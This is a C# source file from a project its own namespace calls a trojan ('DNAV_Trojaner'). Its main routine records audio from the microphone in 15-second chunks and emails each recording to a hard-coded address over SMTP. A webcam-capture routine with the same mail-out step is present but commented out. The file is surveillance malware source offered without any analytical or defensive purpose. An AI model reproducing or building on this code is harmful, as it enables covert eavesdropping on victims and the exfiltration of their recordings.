using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;

namespace DNAV_Trojaner {
    class Program {
        static public void Tonaufnahme() {
            Mailer m = new Mailer("ToMail@mail.de","FromMail@mail.de","FromMail@mail.de","Supergeheim",587,"mail.mail.de");
            int sec = 15;
            Audio.SetPath("Test");
            Audio.Execution func = (path) => {
                Console.WriteLine("send: " + path);
                m.send("Neue Audiodatei", "Eine neue Datei verfügbar:", path);
            };
            Audio.Start(sec, func);
        }

         static public void camaufnahme() {
            Mailer m = new Mailer("ToMail@mail.de","FromMail@mail.de","FromMail@mail.de","Supergeheim",587,"mail.mail.de");
            int sec = 15;
            //Cam.SetPath("Test");
            // Cam.Execution func = (path) => {
            //     Console.WriteLine("send: " + path);
            //     m.send("Neue Videodatei", "Eine neue Datei verfügbar:", path);
            // };
            //Cam.start(sec, func);
        }

        static void Main(string[] args) {
            Tonaufnahme();
        }
    }
}
